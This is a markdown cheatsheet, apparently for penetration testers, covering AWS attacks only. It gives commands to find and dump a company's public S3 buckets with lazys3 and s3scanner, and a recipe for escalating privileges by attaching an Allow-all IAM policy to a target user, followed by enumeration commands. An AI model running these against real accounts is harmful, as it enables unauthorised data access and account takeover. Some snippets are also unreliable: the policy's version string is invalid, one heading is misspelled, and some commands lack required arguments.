# Cloud Hacking Cheatsheet
![AWS](https://img.shields.io/badge/AWS-%23FF9900.svg?style=for-the-badge&logo=amazon-aws&logoColor=white) ![Azure](https://img.shields.io/badge/azure-%230072C6.svg?style=for-the-badge&logo=microsoftazure&logoColor=white) ![Firebase](https://img.shields.io/badge/firebase-%23039BE5.svg?style=for-the-badge&logo=firebase) ![Linode](https://img.shields.io/badge/linode-00A95C?style=for-the-badge&logo=linode&logoColor=white)
## Amazon AWS

### Install awscli
```sh
pip3 install awscli
```

### S3 Bucket Enumeration

#### Search for public buckets from a company using lazys3
```sh
ruby lazys3.rb [COMPANY]
```
#### Search for public buckets from a company using s3scanner
```sh
python3 ./s3scanner.py sites.txt
```

#### Dump all open buckets and log both open and closed buckets using s3scanner
```sh
python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt
```

#### Save the file listings of all open buckets to a file using s3scanner
```sh
python ./s3scanner.py --list names.txt
```

### Escalate IAM User Privileges by Exploiting Misconfigured User Policy
```sh
vim user-policy.json
```

Insert:
```sh
{
    "Version": "2011-09-11",
    "Statement": [
        {

            "Effect": "Allow",

            "Action": "*",

            "Resource": "*"

        }
    ]
}
```

Attach the created policy (user-policy) to the target IAM userâ€™s account:

```sh
aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json

aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy
```

### View user policies
```sh
aws iam list-attached-user-policies --user-name [Target Username]
```

### List users
```sh
aws iam list-users
```

### List buckets
```sh
aws s3api list-buckets --query "Buckets[].Name"
```

### List user policies
```sh
aws iam list-user-policies
```

### List role policies
```sh
aws iam list-role-policies
```

### List froup policies
```sh
aws iam list-group-policies
```

### Create user
```sh
aws iam create-user
```


